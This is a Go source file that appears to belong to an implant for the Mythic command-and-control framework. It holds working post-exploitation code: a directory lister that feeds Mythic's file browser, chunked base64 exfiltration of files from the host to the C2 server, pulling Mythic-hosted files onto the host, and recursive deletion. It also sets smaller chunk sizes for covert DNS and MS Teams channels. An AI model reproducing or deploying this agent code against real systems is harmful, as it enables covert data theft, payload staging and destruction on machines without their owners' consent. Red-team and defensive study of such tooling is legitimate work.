package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// Chunk sizes for file transfers. Mythic's own default is 512000; the
// constrained transports (single small messages per exchange) use less.
const (
	chunkSizeDefault = 512000
	chunkSizeSmall   = 8192
	// maxTransferChunks bounds a runaway transfer loop (~51GB at default).
	maxTransferChunks = 100000
)

// poster sends responses and returns Mythic's per-task replies. Agent
// handlers use a.postResponses; tests inject a fake.
type poster func([]Response) ([]PostReply, error)

// chunkSizeFor returns the transfer chunk size for a C2 profile.
func chunkSizeFor(profile string) int {
	switch profile {
	case "dns", "msteams":
		return chunkSizeSmall
	default:
		return chunkSizeDefault
	}
}

// replyFor finds this task's reply, surfacing Mythic-side errors.
func replyFor(replies []PostReply, taskID string) (PostReply, error) {
	for _, r := range replies {
		if r.TaskID != taskID {
			continue
		}
		if r.Status == "error" {
			if r.Error == "" {
				r.Error = "mythic error"
			}
			return PostReply{}, fmt.Errorf("%s", r.Error)
		}
		return r, nil
	}
	return PostReply{}, fmt.Errorf("no reply for task %s", taskID)
}

// taskParam extracts one named string from a task's parameters blob.
func taskParam(parameters, key string) string {
	var decoded map[string]any
	if err := json.Unmarshal([]byte(parameters), &decoded); err != nil {
		return ""
	}
	s, _ := decoded[key].(string)
	return s
}

func boolPtr(b bool) *bool       { return &b }
func intPtr(i int) *int          { return &i }
func stringPtr(s string) *string { return &s }

// listDir lists one directory for ls: human-readable text plus the
// file_browser object Mythic files into its tree.
func listDir(arg string) (string, *FileBrowser, error) {
	dir := strings.TrimSpace(arg)
	if dir == "" {
		dir = "."
	}
	abs, err := filepath.Abs(dir)
	if err != nil {
		return "", nil, err
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", nil, err
	}
	parent := &FileBrowser{
		Name:       filepath.Base(abs),
		ParentPath: filepath.Dir(abs),
		Success:    boolPtr(true),
	}
	if st, err := os.Stat(dir); err == nil {
		parent.ModifyTime = uint64(st.ModTime().Unix())
		parent.Permissions = FilePerms{ReadOnly: st.Mode().Perm()&0o222 == 0}
	}
	children := []FileChild{}
	var b strings.Builder
	for _, e := range entries {
		child := FileChild{Name: e.Name(), IsFile: !e.IsDir()}
		if info, err := e.Info(); err == nil {
			if !e.IsDir() {
				child.Size = uint64(info.Size())
			}
			child.ModifyTime = uint64(info.ModTime().Unix())
			child.Permissions = FilePerms{ReadOnly: info.Mode().Perm()&0o222 == 0}
		}
		children = append(children, child)
		b.WriteString(e.Name())
		if e.IsDir() {
			b.WriteString("/")
		}
		b.WriteString("\n")
	}
	parent.Files = &children
	return b.String(), parent, nil
}

// downloadToMythic streams a file to Mythic in 1-based chunks, returning a
// summary. The first message registers the transfer (total + first chunk
// together, which Mythic accepts); later ones carry the file_id reply.
func downloadToMythic(taskID, path string, chunkSize int, post poster) (string, error) {
	abs, err := filepath.Abs(path)
	if err != nil {
		return "", err
	}
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	st, err := f.Stat()
	if err != nil {
		return "", err
	}
	if st.IsDir() {
		return "", fmt.Errorf("not a file: %s", path)
	}
	name := filepath.Base(abs)
	if chunkSize <= 0 {
		chunkSize = chunkSizeDefault
	}
	total := int((st.Size() + int64(chunkSize) - 1) / int64(chunkSize))
	if st.Size() == 0 {
		// total_chunks 0 registers an empty file, no chunk data. The
		// summary goes out with the normal batch post, like all chunks.
		replies, err := post([]Response{{
			TaskID: taskID, Completed: false, Status: "success",
			Download: &DownloadPayload{
				TotalChunks: intPtr(0), FullPath: stringPtr(abs), FileName: stringPtr(name),
			},
		}})
		if err != nil {
			return "", err
		}
		if _, err := replyFor(replies, taskID); err != nil {
			return "", err
		}
		return fmt.Sprintf("downloaded %s (0 bytes)", path), nil
	}
	if total > maxTransferChunks {
		return "", fmt.Errorf("file needs %d chunks, over the %d limit", total, maxTransferChunks)
	}
	buf := make([]byte, chunkSize)
	var fileID string
	for chunk := 1; chunk <= total; chunk++ {
		m, rerr := io.ReadFull(f, buf)
		if m == 0 {
			return "", fmt.Errorf("short read at chunk %d", chunk)
		}
		data := base64.StdEncoding.EncodeToString(buf[:m])
		payload := &DownloadPayload{ChunkNum: intPtr(chunk), ChunkData: stringPtr(data)}
		if chunk == 1 {
			payload.TotalChunks = intPtr(total)
			payload.ChunkSize = intPtr(chunkSize)
			payload.FullPath = stringPtr(abs)
			payload.FileName = stringPtr(name)
		} else {
			payload.FileID = stringPtr(fileID)
		}
		last := chunk == total
		out := ""
		if last {
			out = fmt.Sprintf("downloaded %s (%d bytes in %d chunks)", path, st.Size(), total)
		}
		replies, err := post([]Response{{
			TaskID: taskID, Completed: last, Status: "success",
			UserOutput: out, Download: payload,
		}})
		if err != nil {
			return "", err
		}
		reply, err := replyFor(replies, taskID)
		if err != nil {
			return "", err
		}
		if chunk == 1 {
			fileID = reply.FileID
			if fileID == "" {
				return "", fmt.Errorf("mythic issued no file_id")
			}
		}
		if rerr != nil && chunk != total {
			return "", fmt.Errorf("short read at chunk %d", chunk)
		}
	}
	return fmt.Sprintf("downloaded %s (%d bytes in %d chunks)", path, st.Size(), total), nil
}

// uploadFromMythic pulls a Mythic-hosted file to remotePath in 1-based
// chunks, returning a summary.
func uploadFromMythic(taskID, fileID, remotePath string, chunkSize int, post poster) (string, error) {
	if fileID == "" {
		return "", fmt.Errorf("no file id")
	}
	if remotePath == "" {
		return "", fmt.Errorf("no remote path")
	}
	if chunkSize <= 0 {
		chunkSize = chunkSizeDefault
	}
	if dir := filepath.Dir(remotePath); dir != "" {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return "", err
		}
	}
	f, err := os.Create(remotePath)
	if err != nil {
		return "", err
	}
	defer f.Close()
	var written int64
	total := -1
	for chunk := 1; ; chunk++ {
		replies, err := post([]Response{{
			TaskID: taskID, Completed: false, Status: "success",
			Upload: &UploadPayload{ChunkNum: chunk, ChunkSize: intPtr(chunkSize), FileID: stringPtr(fileID)},
		}})
		if err != nil {
			return "", err
		}
		reply, err := replyFor(replies, taskID)
		if err != nil {
			return "", err
		}
		if reply.TotalChunks <= 0 || reply.TotalChunks > maxTransferChunks {
			return "", fmt.Errorf("bad total_chunks %d", reply.TotalChunks)
		}
		total = reply.TotalChunks
		raw, err := base64.StdEncoding.DecodeString(reply.ChunkData)
		if err != nil {
			return "", fmt.Errorf("chunk %d: %w", chunk, err)
		}
		n, err := f.Write(raw)
		if err != nil {
			return "", err
		}
		written += int64(n)
		if chunk >= total {
			break
		}
	}
	summary := fmt.Sprintf("uploaded %s (%d bytes in %d chunks)", remotePath, written, total)
	replies, err := post([]Response{{
		TaskID: taskID, Completed: true, Status: "success", UserOutput: summary,
	}})
	if err != nil {
		return "", err
	}
	if _, err := replyFor(replies, taskID); err != nil {
		return "", err
	}
	return summary, nil
}

// removePath deletes a file or directory tree, returning the tree-pruning
// entry plus a summary.
func removePath(path string) ([]RemovedFile, string, error) {
	trimmed := strings.TrimSpace(path)
	if trimmed == "" {
		return nil, "", fmt.Errorf("no path")
	}
	if _, err := os.Lstat(trimmed); err != nil {
		return nil, "", err
	}
	abs, err := filepath.Abs(trimmed)
	if err != nil {
		return nil, "", err
	}
	if err := os.RemoveAll(trimmed); err != nil {
		return nil, "", err
	}
	return []RemovedFile{{Path: abs}}, fmt.Sprintf("removed %s", trimmed), nil
}

// makeDir creates a directory with parents.
func makeDir(path string) (string, error) {
	trimmed := strings.TrimSpace(path)
	if trimmed == "" {
		return "", fmt.Errorf("no path")
	}
	if err := os.MkdirAll(trimmed, 0o755); err != nil {
		return "", err
	}
	return fmt.Sprintf("created %s", trimmed), nil
}
